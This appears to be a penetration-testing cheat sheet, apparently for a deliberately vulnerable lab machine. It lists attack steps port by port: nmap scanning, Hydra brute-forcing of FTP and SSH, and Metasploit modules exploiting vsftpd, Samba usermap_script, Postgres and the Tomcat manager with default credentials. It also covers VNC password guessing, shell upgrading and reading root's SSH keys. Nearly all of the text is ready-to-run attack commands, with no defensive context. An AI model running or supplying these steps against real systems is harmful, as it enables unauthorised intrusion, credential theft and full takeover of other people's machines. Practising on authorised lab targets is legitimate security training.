#### Nmap

 nmap -Pn -sV Target

### Port 21
#### Hydra

sudo hydra -L user.txt -P pass.txt target ftp   ----> FTP

#### Vsftpd Exploit

In msfconsole

search vsftpd version

use exploit/unix/ftp/
show options
set RHOSTS ip
exploit

### Port 22

#### Hydra

hydra -L user.txt -P pass.txt 192.168.1.103 ssh

#### SSH BFA
use **auxiliary/scanner/ssh/ssh_login**
show options

set RHOSTS ip

set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt

or 

set USER_FILE /usr/share/user.txt
set PASS_FILE /usr/share/pass.txt

or 

**set STOP_ON_SUCCESS true**

set VERBOSE true

exploit

If sessions opened type
sessions
sessions 1 or 2 or whatever the shell opened is or sessions -u 1 or 2
shell (For better view type shell, it will look like linux)

Connect: ssh username@ip

### Port 139 & 445 (Samba)

use **exploit/multi/samba/usermap_script**
show options
set RHOSTS ip
exploit

id , uname -a, python -c 'import pty:pty.spawn("/bin/bash")'

### Port  5432 (Postgres)

search postgres
use **exploit/linux/postgres/postgres_payload**
set RHOSTS ip
set LHOST ip
run
sessions -u 1 or 2 or whichever

### Port 5900 (VNC)

use **auxiliary/scanner/vnc/vnc_login**
set RHOSTS
exploit

after getting password go to terminal

vncviewer vulnerable_ip

For authorized ssh keys after login:
cd root
ls -la
cd .ssh
ls -la
cat authorized_keys

### Port 8180 (Not default port) (Tomcat)

use exploit/multi/http/tomcat_mgr_upload

show options

set RHOSTS

set RPORT 8180

set HttpUsername tomcat

set HttpPassword tomcat
